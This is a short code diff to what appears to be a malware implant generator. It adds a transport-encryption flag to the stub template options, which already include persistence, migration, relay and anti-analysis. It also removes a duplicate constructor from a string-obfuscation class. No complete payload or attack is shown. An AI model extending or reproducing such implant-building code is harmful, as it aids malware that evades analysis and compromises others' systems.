@@ -292,6 +292,7 @@ class AgentStubGenerator:
             "persistence": cfg.persistence,
             "migration": cfg.migration,
             "relay": cfg.relay,
+            "enc": cfg.transport.lower() in ("http", "https"),
             "anti": cfg.anti_analysis,
             "is_win": cfg.platform == "windows",
             "is_linux": cfg.platform == "linux",
@@ -525,11 +526,6 @@ class _Obfuscator:
         self._mask = _enc(mask or "m")
         self._table: list = []
         self._aliases: dict = {}
-
-    # -- string table --------------------------------------------------
-    def __init__(self, key: str = "{{ cfg.obfuscation_key or rnd_str(32) }}"):
-        self._key = _enc(key or _sg.printable[:16])
-        self._table: list[bytes] = []
 
     def store(self, literal: str) -> str:
         """Encrypt a literal; return the runtime retriever expression."""
